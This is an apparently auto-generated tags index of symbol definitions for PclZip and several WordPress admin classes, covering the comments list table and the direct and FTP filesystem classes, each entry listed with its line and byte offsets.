    $v_data = unpack('Vid', $v_binary_data);v_data4379,154414
    $v_binary_data = fread($this->zip_fd, 42);v_binary_data4393,154753
    $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);p_header4409,155187
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;v_hour4437,156166
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;v_minute4438,156219
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;v_seconde4439,156273
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;v_year4442,156354
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;v_month4443,156415
      $v_day = $p_header['mdate'] & 0x001F;v_day4444,156468
  function privCheckFileHeaders(&$p_local_header, &$p_central_header)privCheckFileHeaders4481,157502
    $v_result=1;v_result4483,157576
  function privReadEndCentralDir(&$p_central_dir)privReadEndCentralDir4518,158810
    $v_result=1;v_result4520,158864
    $v_size = filesize($this->zipname);v_size4523,158925
    $v_found = 0;v_found4536,159420
      $v_binary_data = @fread($this->zip_fd, 4);v_binary_data4549,159826
      $v_data = @unpack('Vid', $v_binary_data);v_data4550,159875
        $v_found = 1;v_found4554,159996
      $v_pos = ftell($this->zip_fd);v_pos4557,160027
      $v_maximum_size = 65557; // 0xFFFF + 22;v_maximum_size4562,160172
        $v_maximum_size = $v_size;v_maximum_size4564,160256
      $v_pos = ftell($this->zip_fd);v_pos4576,160705
      $v_bytes = 0x00000000;v_bytes4577,160742
        $v_byte = @fread($this->zip_fd, 1);v_byte4581,160839
        $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte);v_bytes4587,161193
    $v_binary_data = fread($this->zip_fd, 18);v_binary_data4612,161766
    $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);v_data4626,162140
    //for(reset($p_central_dir); $key = key($p_central_dir); next($p_central_dir)) {key4661,163400
  function privDeleteByRule(&$p_result_list, &$p_options)privDeleteByRule4675,163892
    $v_result=1;v_result4677,163954
    $v_list_detail = array();v_list_detail4678,163971
    $v_central_dir = array();v_central_dir4688,164195
    $v_pos_entry = $v_central_dir['offset'];v_pos_entry4700,164508
    $v_header_list = array();v_header_list4715,164897
    $j_start = 0;j_start4716,164927
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)v_nb_extracted4717,164945
      $v_found = false;v_found4735,165450
                      $v_found = true;v_found4750,166271
                      $v_found = true;v_found4754,166582
                  $v_found = true;v_found4759,166814
              $v_found = true;v_found4771,167208
              $v_found = true;v_found4781,167545
                  $v_found = true;v_found4793,168037
                  $j_start = $j+1;j_start4796,168156
      	$v_found = true;v_found4805,168351
        $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';v_zip_temp_name4823,168685
        $v_temp_zip = new PclZip($v_zip_temp_name);v_temp_zip4826,168809
            $v_local_header = array();v_local_header4855,169792
        $v_offset = @ftell($v_temp_zip->zip_fd);v_offset4897,171321
        $v_comment = '';v_comment4917,172030
          $v_comment = $p_options[PCLZIP_OPT_COMMENT];v_comment4919,172108
        $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;v_size4923,172232
  function privDirCheck($p_dir, $p_is_dir=false)privDirCheck4985,174195
  function privDirCheck($p_dir, $p_is_dir=false)p_is_dir4985,174195
    $v_result = 1;v_result4987,174248
      $p_dir = substr($p_dir, 0, strlen($p_dir)-1);p_dir4993,174359
    $p_parent_dir = dirname($p_dir);p_parent_dir5003,174575
  //   If $p_archive_to_add does not exist, the function exit with a success result.exit5036,175409
  function privMerge(&$p_archive_to_add)privMerge5040,175619
    $v_result=1;v_result5042,175664
      $v_result = 1;v_result5049,175837
      $v_result = $this->privDuplicate($p_archive_to_add->zipname);v_result5060,176023
    $v_central_dir = array();v_central_dir5074,176338
    $v_central_dir_to_add = array();v_central_dir_to_add5094,176817
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';v_zip_temp_name5107,177167
    $v_size = $v_central_dir['offset'];v_size5123,177780
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5126,177851
      $v_buffer = fread($this->zip_fd, $v_read_size);v_buffer5127,177943
    $v_size = $v_central_dir_to_add['offset'];v_size5133,178167
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5136,178245
      $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);v_buffer5137,178337
    $v_offset = @ftell($v_zip_temp_fd);v_offset5143,178546
    $v_size = $v_central_dir['size'];v_size5146,178652
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5149,178721
      $v_buffer = @fread($this->zip_fd, $v_read_size);v_buffer5150,178813
    $v_size = $v_central_dir_to_add['size'];v_size5156,179030
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5159,179106
      $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);v_buffer5160,179198
    $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];v_comment5166,179396
    $v_size = @ftell($v_zip_temp_fd)-$v_offset;v_size5169,179538
    $v_swap = $this->zip_fd;v_swap5174,179785
    $this->zip_fd = $v_zip_temp_fd;zip_fd5175,179814
    $v_zip_temp_fd = $v_swap;v_zip_temp_fd5176,179850
      $this->zip_fd = null;zip_fd5184,180179
    $v_swap = $this->zip_fd;v_swap5194,180369
    $this->zip_fd = $v_zip_temp_fd;zip_fd5195,180398
    $v_zip_temp_fd = $v_swap;v_zip_temp_fd5196,180434
  function privDuplicate($p_archive_filename)privDuplicate5225,181304
    $v_result=1;v_result5227,181354
      $v_result = 1;v_result5234,181534
    $v_size = filesize($p_archive_filename);v_size5260,182255
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5263,182331
      $v_buffer = fread($v_zip_temp_fd, $v_read_size);v_buffer5264,182423
  function privErrorLog($p_error_code=0, $p_error_string='')privErrorLog5285,183058
  function privErrorLog($p_error_code=0, $p_error_string='')p_error_string5285,183058
      $this->error_code = $p_error_code;error_code5291,183226
      $this->error_string = $p_error_string;error_string5292,183267
  function privErrorReset()privErrorReset5302,183651
      $this->error_code = 0;error_code5308,183761
      $this->error_string = '';error_string5309,183790
  function privDisableMagicQuotes()privDisableMagicQuotes5320,184190
    $v_result=1;v_result5322,184230
    // ----- Look if function existsexists5324,184248
	$this->magic_quotes_status = @get_magic_quotes_runtime();magic_quotes_status5336,184584
  function privSwapBackMagicQuotes()privSwapBackMagicQuotes5354,185157
    $v_result=1;v_result5356,185198
    // ----- Look if function existsexists5358,185216
  function PclZipUtilPathReduction($p_dir)PclZipUtilPathReduction5389,186157
    $v_result = "";v_result5391,186204
      $v_list = explode("/", $p_dir);v_list5396,186333
      $v_skip = 0;v_skip5399,186424
          // Should be the first $i=0, but no check is donei5404,186605
            $v_result = "/".$v_result;v_result5412,186836
		        $v_result = $p_dir;v_result5416,186987
                $v_skip = 0;v_skip5417,187017
            $v_result = $v_list[$i];v_result5422,187151
            $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");v_result5436,187472
            $v_result = '../'.$v_result;v_result5444,187661
  //   This function indicates if the path $p_path is under the $p_dir tree. Or,indicates5458,188030
  //   The function indicates also if the path is exactly the same as the dir.indicates5461,188204
  //   This function supports path with duplicated '/' like '//', but does notsupports5462,188283
  function PclZipUtilPathInclusion($p_dir, $p_path)PclZipUtilPathInclusion5470,188674
    $v_result = 1;v_result5472,188730
      $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);p_dir5477,188891
      $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);p_path5481,189080
    $v_list_dir = explode("/", $p_dir);v_list_dir5485,189228
    $v_list_dir_size = sizeof($v_list_dir);v_list_dir_size5486,189268
    $v_list_path = explode("/", $p_path);v_list_path5487,189312
    $v_list_path_size = sizeof($v_list_path);v_list_path_size5488,189354
    $i = 0;i5491,189438
    $j = 0;j5492,189450
        $v_result = 0;v_result5507,189888
        $v_result = 2;v_result5523,190347
        $v_result = 0;v_result5527,190468
  function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)PclZipUtilCopyBlock5547,191114
  function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)p_mode5547,191114
    $v_result = 1;v_result5549,191186
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5555,191267
        $v_buffer = @fread($p_src, $v_read_size);v_buffer5556,191361
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5565,191575
        $v_buffer = @gzread($p_src, $v_read_size);v_buffer5566,191669
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5575,191884
        $v_buffer = @fread($p_src, $v_read_size);v_buffer5576,191978
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);v_read_size5585,192193
        $v_buffer = @gzread($p_src, $v_read_size);v_buffer5586,192287
  //   This function tries to do a simple rename() function. If it fails, ittries5600,192711
  function PclZipUtilRename($p_src, $p_dest)PclZipUtilRename5609,193104
    $v_result = 1;v_result5611,193153
        $v_result = 0;v_result5618,193329
        $v_result = 0;v_result5621,193395
  function PclZipUtilOptionText($p_option)PclZipUtilOptionText5639,193967
    $v_list = get_defined_constants();v_list5642,194015
    for (reset($v_list); $v_key = key($v_list); next($v_list)) {v_key5643,194054
	    $v_prefix = substr($v_key, 0, 10);v_prefix5644,194119
    $v_result = 'Unknown';v_result5653,194368
  function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)PclZipUtilTranslateWinPath5670,194991
  function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)p_remove_disk_letter5670,194991
          $p_path = substr($p_path, $v_position+1);p_path5675,195247
          $p_path = strtr($p_path, '\\', '/');p_path5679,195442

wordpress/wp-admin/includes/class-wp-comments-list-table.php,8897
class WP_Comments_List_Table extends WP_List_Table {WP_Comments_List_Table18,256
	var $checkbox = true;checkbox20,310
	var $checkbox = true;checkbox20,310
	var $pending_count = array();pending_count22,334
	var $pending_count = array();pending_count22,334
	function __construct() {__construct24,366
		$post_id = isset( $_REQUEST['p'] ) ? absint( $_REQUEST['p'] ) : 0;post_id27,412
	function ajax_user_can() {ajax_user_can39,693
	function prepare_items() {prepare_items43,766
		$comment_status = isset( $_REQUEST['comment_status'] ) ? $_REQUEST['comment_status'] : 'all';comment_status46,855
			$comment_status = 'all';comment_status48,1047
		$comment_type = !empty( $_REQUEST['comment_type'] ) ? $_REQUEST['comment_type'] : '';comment_type50,1076
		$search = ( isset( $_REQUEST['s'] ) ) ? $_REQUEST['s'] : '';search52,1165
		$user_id = ( isset( $_REQUEST['user_id'] ) ) ? $_REQUEST['user_id'] : '';user_id54,1229
		$orderby = ( isset( $_REQUEST['orderby'] ) ) ? $_REQUEST['orderby'] : '';orderby56,1306
		$order = ( isset( $_REQUEST['order'] ) ) ? $_REQUEST['order'] : '';order57,1382
		$comments_per_page = $this->get_per_page( $comment_status );comments_per_page59,1453
		$doing_ajax = defined( 'DOING_AJAX' ) && DOING_AJAX;doing_ajax61,1517
			$number = (int) $_REQUEST['number'];number64,1613
			$number = $comments_per_page + min( 8, $comments_per_page ); // Grab a few extranumber67,1666
		$page = $this->get_pagenum();page70,1755
			$start = $_REQUEST['start'];start73,1827
			$start = ( $page - 1 ) * $comments_per_page;start75,1870
		$status_map = array(status_map82,2017
		$args = array(args87,2099
		$_comments = get_comments( $args );_comments99,2424
		$this->items = array_slice( $_comments, 0, $comments_per_page );items103,2502
		$this->extra_items = array_slice( $_comments, $comments_per_page );extra_items104,2569
		$total_comments = get_comments( array_merge( $args, array('count' => true, 'offset' => 0, 'number' => 0) ) );total_comments106,2640
		$_comment_post_ids = array();_comment_post_ids108,2753
		$_comment_post_ids = array_unique( $_comment_post_ids );_comment_post_ids113,2872
		$this->pending_count = get_pending_comments_num( $_comment_post_ids );pending_count115,2932
	function get_per_page( $comment_status = 'all' ) {get_per_page123,3128
	function get_per_page( $comment_status = 'all' ) {comment_status123,3128
		$comments_per_page = $this->get_items_per_page( 'edit_comments_per_page' );comments_per_page124,3180
		$comments_per_page = apply_filters( 'comments_per_page', $comments_per_page, $comment_status );comments_per_page125,3258
	function no_items() {no_items129,3389
	function get_views() {get_views138,3566
		$status_links = array();status_links141,3642
		$num_comments = ( $post_id ) ? wp_count_comments( $post_id ) : wp_count_comments();num_comments142,3669
		$stati = array(stati145,4041
		$link = 'edit-comments.php';link156,4785
			$link = add_query_arg( 'comment_type', $comment_type, $link );link158,4873
		foreach ( $stati as $status => $label ) {status160,4940
			$class = ( $status == $comment_status ) ? ' class="current"' : '';class161,4984
			$link = add_query_arg( 'comment_status', $status, $link );link165,5131
				$link = add_query_arg( 'p', absint( $post_id ), $link );link167,5212
				$link = add_query_arg( 's', esc_attr( stripslashes( $_REQUEST['s'] ) ), $link );link171,5430
		$status_links = apply_filters( 'comment_status_links', $status_links );status_links179,5717
	function get_bulk_actions() {get_bulk_actions183,5819
		$actions = array();actions186,5877
	function extra_tablenav( $which ) {extra_tablenav207,6636
				$comment_types = apply_filters( 'admin_comment_types_dropdown', array(comment_types217,6896
				foreach ( $comment_types as $type => $label )type222,7048
			$title = ( 'spam' == $comment_status ) ? esc_attr__( 'Empty Spam' ) : esc_attr__( 'Empty Trash' );title232,7520
	function current_action() {current_action239,7777
	function get_columns() {get_columns246,7949
		$columns = array();columns249,7995
	function get_sortable_columns() {get_sortable_columns263,8297
	function display() {display270,8427
		<?php $this->items = $this->extra_items; $this->display_rows(); ?>items296,9040
	function single_row( $a_comment ) {single_row304,9178
		$comment = $a_comment;comment307,9242
		$the_comment_class = join( ' ', get_comment_class( wp_get_comment_status( $comment->comment_ID ) ) );the_comment_class308,9267
		$post = get_post( $comment->comment_post_ID );post310,9372
		$this->user_can = current_user_can( 'edit_comment', $comment->comment_ID );user_can312,9422
	function column_cb( $comment ) {column_cb319,9645
	function column_comment( $comment ) {column_comment324,9799
		$user_can = $this->user_can;user_can327,9872
		$comment_url = esc_url( get_comment_link( $comment->comment_ID ) );comment_url329,9904
		$the_comment_status = wp_get_comment_status( $comment->comment_ID );the_comment_status330,9974
		$ptime = date( 'G', strtotime( $comment->comment_date ) );ptime332,10046
			$ptime = sprintf( __( '%s ago' ), human_time_diff( $ptime ) );ptime334,10151
			$ptime = mysql2date( __( 'Y/m/d \a\t g:i A' ), $comment->comment_date );ptime336,10224
			$del_nonce = esc_html( '_wpnonce=' . wp_create_nonce( "delete-comment_$comment->comment_ID" ) );del_nonce339,10322
			$approve_nonce = esc_html( '_wpnonce=' . wp_create_nonce( "approve-comment_$comment->comment_ID" ) );approve_nonce340,10422
			$url = "comment.php?c=$comment->comment_ID";url342,10528
			$approve_url = esc_url( $url . "&action=approvecomment&$approve_nonce" );approve_url344,10577
			$unapprove_url = esc_url( $url . "&action=unapprovecomment&$approve_nonce" );unapprove_url345,10654
			$spam_url = esc_url( $url . "&action=spamcomment&$del_nonce" );spam_url346,10735
			$unspam_url = esc_url( $url . "&action=unspamcomment&$del_nonce" );unspam_url347,10802
			$trash_url = esc_url( $url . "&action=trashcomment&$del_nonce" );trash_url348,10873
			$untrash_url = esc_url( $url . "&action=untrashcomment&$del_nonce" );untrash_url349,10942
			$delete_url = esc_url( $url . "&action=deletecomment&$del_nonce" );delete_url350,11015
			$parent = get_comment( $comment->comment_parent );parent360,11517
			$parent_link = esc_url( get_comment_link( $comment->comment_parent ) );parent_link361,11571
			$name = get_comment_author( $parent->comment_ID );name362,11646
			$actions = array(actions381,12523
			$actions = apply_filters( 'comment_row_actions', array_filter( $actions ), $comment );actions420,16010
			$i = 0;i422,16101
			foreach ( $actions as $action => $link ) {action424,16149
				( ( ( 'approve' == $action || 'unapprove' == $action ) && 2 === $i ) || 1 === $i ) ? $sep = '' : $sep = ' | ';sep426,16205
				elseif ( ( $action == 'untrash' && $the_comment_status == 'trash' ) || ( $action == 'unspam' && $the_comment_status == 'spam' ) ) {action431,16520
	function column_author( $comment ) {column_author444,16906
		$author_url = get_comment_author_url();author_url447,16971
			$author_url = '';author_url449,17047
		$author_url_display = preg_replace( '|http://(www\.)?|i', '', $author_url );author_url_display450,17068
			$author_url_display = substr( $author_url_display, 0, 49 ) . '...';author_url_display452,17191
	function column_date( $comment ) {column_date474,17804
	function column_response( $comment ) {column_response478,17898
			$pending_comments = $this->pending_count[$post->ID];pending_comments482,18007
			$_pending_count_temp = get_pending_comments_num( array( $post->ID ) );_pending_count_temp484,18074
			$pending_comments = $this->pending_count[$post->ID] = $_pending_count_temp[$post->ID];pending_comments485,18148
			$post_link = "<a href='" . get_edit_post_link( $post->ID ) . "'>";post_link489,18297
			$post_link = get_the_title( $post->ID );post_link492,18432
		$post_type_object = get_post_type_object( $post->post_type );post_type_object499,18664
		if ( 'attachment' == $post->post_type && ( $thumb = wp_get_attachment_image( $post->ID, array( 80, 60 ), true ) ) )thumb502,18849
	function column_default( $comment, $column_name ) {column_default506,18987
class WP_Post_Comments_List_Table extends WP_Comments_List_Table {WP_Post_Comments_List_Table521,19288
	function get_column_info() {get_column_info523,19356
		$this->_column_headers = array(_column_headers524,19386
	function get_table_classes() {get_table_classes536,19585
		$classes = parent::get_table_classes();classes537,19617
	function display( $output_empty = false ) {display542,19713
	function display( $output_empty = false ) {output_empty542,19713
	function get_per_page( $comment_status = false ) {get_per_page555,20172
	function get_per_page( $comment_status = false ) {comment_status555,20172

wordpress/wp-admin/includes/class-wp-filesystem-base.php,3499
 * Base WordPress Filesystem class for which Filesystem implementations extendfor10,100
class WP_Filesystem_Base {WP_Filesystem_Base14,200
	var $verbose = false;verbose22,343
	var $verbose = false;verbose22,343
	var $cache = array();cache30,493
	var $cache = array();cache30,493
	var $method = '';method39,649
	var $method = '';method39,649
	function abspath() {abspath48,826
		$folder = $this->find_folder(ABSPATH);folder49,848
			$folder = '/';folder52,1085
	function wp_content_dir() {wp_content_dir62,1288
	function wp_plugins_dir() {wp_plugins_dir73,1532
	function wp_themes_dir() {wp_themes_dir84,1782
	function wp_lang_dir() {wp_lang_dir95,2026
	function find_base_dir($base = '.', $echo = false) {find_base_dir112,2479
	function find_base_dir($base = '.', $echo = false) {echo112,2479
		$this->verbose = $echo;verbose114,2636
	function get_base_dir($base = '.', $echo = false) {get_base_dir130,3073
	function get_base_dir($base = '.', $echo = false) {echo130,3073
		$this->verbose = $echo;verbose132,3229
	function find_folder($folder) {find_folder148,3606
			$constant_overrides = array( 'FTP_BASE' => ABSPATH, 'FTP_CONTENT_DIR' => WP_CONTENT_DIR, 'FTP_PLUGIN_DIR' => WP_PLUGIN_DIR, 'FTP_LANG_DIR' => WP_LANG_DIR );constant_overrides151,3690
			foreach ( $constant_overrides as $constant => $dir )constant152,3850
				if ( defined($constant) && $folder === $dir )folder153,3906
			$folder = str_replace('\\', '/', $folder); //Windows path sanitisationfolder156,4049
		$folder = preg_replace('|^([a-z]{1}):|i', '', $folder); //Strip out windows drive letter if it's there.folder160,4164
		$folder = str_replace('\\', '/', $folder); //Windows path sanitisationfolder161,4270
			$folder = trailingslashit($folder);folder167,4494
		if ( $return = $this->search_for_folder($folder) )return171,4594
	 * @param bool $loop if the function has recursed, Internal use onlyhas186,4947
	function search_for_folder($folder, $base = '.', $loop = false ) {search_for_folder189,5074
	function search_for_folder($folder, $base = '.', $loop = false ) {base189,5074
			$base = trailingslashit($this->cwd());base191,5182
		$folder = untrailingslashit($folder);folder193,5225
		$folder_parts = explode('/', $folder);folder_parts195,5266
		$last_path = $folder_parts[ count($folder_parts) - 1 ];last_path196,5307
		$files = $this->dirlist( $base );files198,5366
			if ( $key == $last_path )key201,5441
				$newdir = trailingslashit(path_join($base, $key));newdir210,5994
				if ( $ret = $this->search_for_folder( $folder, $newdir, $loop) )ret213,6131
			return false; //Prevent this function from looping again.from225,6577
	function gethchmod($file){gethchmod243,7170
		$perms = $this->getchmod($file);perms244,7198
			$info = 's';info246,7278
			$info = 'l';info248,7350
			$info = '-';info250,7416
			$info = 'b';info252,7488
			$info = 'd';info254,7556
			$info = 'c';info256,7632
			$info = 'p';info258,7700
			$info = 'u';info260,7734
	function getnumchmodfromh($mode) {getnumchmodfromh298,8794
		$realmode = '';realmode299,8830
		$legal =  array('', 'w', 'r', 'x', '-');legal300,8848
		$attarray = preg_split('//', $mode);attarray301,8891
		$mode = str_pad($realmode, 9, '-');mode307,9060
		$trans = array('-'=>'0', 'r'=>'4', 'w'=>'2', 'x'=>'1');trans308,9098
		$mode = strtr($mode,$trans);mode309,9156
		$newmode = '';newmode311,9188
	function is_binary( $text ) {is_binary327,9591

wordpress/wp-admin/includes/class-wp-filesystem-direct.php,4247
class WP_Filesystem_Direct extends WP_Filesystem_Base {WP_Filesystem_Direct17,288
	var $errors = null;errors18,344
	var $errors = null;errors18,344
	function __construct($arg) {__construct24,434
		$this->method = 'direct';method25,464
		$this->errors = new WP_Error();errors26,492
	function connect() {connect33,668
	 * @return string|bool The function returns the read data or false on failure.returns40,803
	function get_contents($file) {get_contents42,888
	function get_contents_array($file) {get_contents_array51,1125
	function put_contents($file, $contents, $mode = false ) {put_contents62,1473
	function put_contents($file, $contents, $mode = false ) {mode62,1473
	function cwd() {cwd75,1818
	function chdir($dir) {chdir84,2006
	function chgrp($file, $group, $recursive = false) {chgrp95,2346
	function chgrp($file, $group, $recursive = false) {recursive95,2346
		$file = trailingslashit($file);file103,2610
		$filelist = $this->dirlist($file);filelist104,2644
	function chmod($file, $mode = false, $recursive = false) {chmod118,3149
	function chmod($file, $mode = false, $recursive = false) {mode118,3149
				$mode = FS_CHMOD_FILE;mode121,3260
				$mode = FS_CHMOD_DIR;mode123,3322
		$file = trailingslashit($file);file131,3501
		$filelist = $this->dirlist($file);filelist132,3535
		foreach ( (array)$filelist as $filename => $filemeta)filename133,3572
	function chown($file, $owner, $recursive = false) {chown146,3991
	function chown($file, $owner, $recursive = false) {recursive146,3991
		$filelist = $this->dirlist($file);filelist154,4255
	function owner($file) {owner166,4530
		$owneruid = @fileowner($file);owneruid167,4555
		$ownerarray = posix_getpwuid($owneruid);ownerarray172,4692
	function getchmod($file) {getchmod183,4955
	function group($file) {group186,5032
		$gid = @filegroup($file);gid187,5057
		$grouparray = posix_getgrgid($gid);grouparray192,5179
	function copy($source, $destination, $overwrite = false, $mode = false) {copy196,5251
	function copy($source, $destination, $overwrite = false, $mode = false) {overwrite196,5251
		$rtval = copy($source, $destination);rtval200,5397
	function move($source, $destination, $overwrite = false) {move206,5511
	function move($source, $destination, $overwrite = false) {overwrite206,5511
	function delete($file, $recursive = false, $type = false) {delete222,5954
	function delete($file, $recursive = false, $type = false) {recursive222,5954
		$file = str_replace('\\', '/', $file); //for win32, occasional problems deleting files otherwisefile225,6171
		$file = trailingslashit($file);file233,6476
		$filelist = $this->dirlist($file, true);filelist234,6510
		$retval = true;retval236,6554
			foreach ($filelist as $filename => $fileinfo)filename238,6638
					$retval = false;retval240,6764
			$retval = false;retval243,6834
	function exists($file) {exists247,6876
	function is_file($file) {is_file251,6936
	function is_dir($path) {is_dir255,6993
	function is_readable($file) {is_readable259,7048
	function is_writable($file) {is_writable263,7113
	function atime($file) {atime267,7178
	function mtime($file) {mtime271,7235
	function size($file) {size274,7291
	function touch($file, $time = 0, $atime = 0) {touch278,7346
	function touch($file, $time = 0, $atime = 0) {time278,7346
			$time = time();time280,7412
			$atime = time();atime282,7450
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {mkdir286,7513
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {chmod286,7513
		$path = untrailingslashit($path);path288,7657
			$chmod = FS_CHMOD_DIR;chmod293,7751
	function rmdir($path, $recursive = false) {rmdir305,7966
	function rmdir($path, $recursive = false) {recursive305,7966
	function dirlist($path, $include_hidden = true, $recursive = false) {dirlist309,8058
	function dirlist($path, $include_hidden = true, $recursive = false) {include_hidden309,8058
			$limit_file = basename($path);limit_file311,8162
			$path = dirname($path);path312,8196
			$limit_file = false;limit_file314,8234
		$dir = @dir($path);dir320,8313
		$ret = array();ret324,8369
			$struc = array();struc327,8435

wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php,5439
class WP_Filesystem_FTPext extends WP_Filesystem_Base {WP_Filesystem_FTPext17,262
	var $link;link18,318
	var $errors = null;errors19,330
	var $errors = null;errors19,330
	var $options = array();options20,351
	var $options = array();options20,351
	function __construct($opt='') {__construct22,377
		$this->method = 'ftpext';method23,410
		$this->errors = new WP_Error();errors24,438
			define('FS_TIMEOUT', 240);FS_TIMEOUT36,808
			$this->wp_base = $opt['base'];wp_base49,1145
	function connect() {connect67,1698
			$this->link = @ftp_ssl_connect($this->options['hostname'], $this->options['port'], FS_CONNECT_TIMEOUT);link69,1821
			$this->link = @ftp_connect($this->options['hostname'], $this->options['port'], FS_CONNECT_TIMEOUT);link71,1935
	function get_contents($file, $type = '', $resumepos = 0 ) {get_contents91,2680
	function get_contents($file, $type = '', $resumepos = 0 ) {type91,2680
			$type = FTP_BINARY;type93,2763
		$tempfile = wp_tempnam($file);tempfile95,2787
		$temp = fopen($tempfile, 'w+');temp96,2820
		$contents = '';contents105,3048
	function get_contents_array($file) {get_contents_array114,3191
	function put_contents($file, $contents, $mode = false ) {put_contents118,3285
	function put_contents($file, $contents, $mode = false ) {mode118,3285
		$tempfile = wp_tempnam($file);tempfile119,3344
		$temp = fopen($tempfile, 'w+');temp120,3377
		$type = $this->is_binary($contents) ? FTP_BINARY : FTP_ASCII;type127,3548
		$ret = @ftp_fput($this->link, $file, $temp, $type);ret128,3612
	function cwd() {cwd137,3755
		$cwd = @ftp_pwd($this->link);cwd138,3773
			$cwd = trailingslashit($cwd);cwd140,3819
	function chdir($dir) {chdir143,3870
	function chgrp($file, $group, $recursive = false ) {chgrp146,3937
	function chgrp($file, $group, $recursive = false ) {recursive146,3937
	function chmod($file, $mode = false, $recursive = false) {chmod149,4010
	function chmod($file, $mode = false, $recursive = false) {mode149,4010
				$mode = FS_CHMOD_FILE;mode152,4121
				$mode = FS_CHMOD_DIR;mode154,4183
			$filelist = $this->dirlist($file);filelist161,4327
			foreach ( (array)$filelist as $filename => $filemeta )filename162,4365
	function chown($file, $owner, $recursive = false ) {chown171,4698
	function chown($file, $owner, $recursive = false ) {recursive171,4698
	function owner($file) {owner174,4771
		$dir = $this->dirlist($file);dir175,4796
	function getchmod($file) {getchmod178,4862
		$dir = $this->dirlist($file);dir179,4890
	function group($file) {group182,4957
		$dir = $this->dirlist($file);dir183,4982
	function copy($source, $destination, $overwrite = false, $mode = false) {copy186,5048
	function copy($source, $destination, $overwrite = false, $mode = false) {overwrite186,5048
		$content = $this->get_contents($source);content189,5193
	function move($source, $destination, $overwrite = false) {move194,5344
	function move($source, $destination, $overwrite = false) {overwrite194,5344
	function delete($file, $recursive = false, $type = false) {delete198,5465
	function delete($file, $recursive = false, $type = false) {recursive198,5465
		$filelist = $this->dirlist( trailingslashit($file) );filelist206,5719
	function exists($file) {exists213,5990
		$list = @ftp_nlist($this->link, $file);list214,6016
	function is_file($file) {is_file217,6120
	function is_dir($path) {is_dir220,6206
		$cwd = $this->cwd();cwd221,6232
		$result = @ftp_chdir($this->link, trailingslashit($path) );result222,6255
		if ( $result && $path == $this->cwd() || $this->cwd() != $cwd ) {path223,6317
	function is_readable($file) {is_readable229,6458
	function is_writable($file) {is_writable233,6577
	function atime($file) {atime237,6696
	function mtime($file) {mtime240,6740
	function size($file) {size243,6807
	function touch($file, $time = 0, $atime = 0) {touch246,6873
	function touch($file, $time = 0, $atime = 0) {time246,6873
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {mkdir249,6940
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {chmod249,6940
		$path = untrailingslashit($path);path250,7013
	function rmdir($path, $recursive = false) {rmdir263,7292
	function rmdir($path, $recursive = false) {recursive263,7292
	function parselisting($line) {parselisting267,7384
		static $is_windows;is_windows268,7416
			$is_windows = stripos( ftp_systype($this->link), 'win') !== false;is_windows270,7468
			$b = array();b273,7683
		} elseif ( !$is_windows && $lucifer = preg_split('/[ ]/', $line, 9, PREG_SPLIT_NO_EMPTY)) {lucifer292,8297
			$lcount = count($lucifer);lcount294,8413
			$b = array();b297,8480
			if ( $lcount == 8 ) {lcount311,8853
	function dirlist($path = '.', $include_hidden = true, $recursive = false) {dirlist336,9630
	function dirlist($path = '.', $include_hidden = true, $recursive = false) {include_hidden336,9630
			$limit_file = basename($path);limit_file338,9740
			$path = dirname($path) . '/';path339,9774
			$limit_file = false;limit_file341,9818
		$pwd = @ftp_pwd($this->link);pwd344,9847
		$list = @ftp_rawlist($this->link, '-a', false);list347,9986
		$dirlist = array();dirlist353,10182
		foreach ( $list as $k => $v ) {k354,10204
			$entry = $this->parselisting($v);entry355,10238
		$ret = array();ret371,10572
	function __destruct() {__destruct385,10892

